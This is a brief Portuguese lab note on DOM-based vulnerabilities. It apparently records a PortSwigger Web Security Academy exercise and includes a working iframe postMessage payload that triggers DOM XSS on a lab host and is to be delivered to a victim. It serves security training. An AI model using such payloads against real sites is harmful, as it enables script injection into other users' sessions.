# Vulnerabilidades DOM Based

Para identificar essas vulnerabilidades é recomendado utilizar o Brwoser da PortSwigger e a extensão que identifica esse tipo de exploração.

Também pode-se identificar analisando o código fonte, principalmente de arquivos JavaScript.

<br>

## Laboratórios

**DOM XSS using web messages**

Perceba que a página home contém a função `addEventListener()` que espera uma mensagem web.

Envie isso para a vítima atrás do exploit server:
```
<iframe src="//0a8100fe032e3917c66ead67003c0020.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
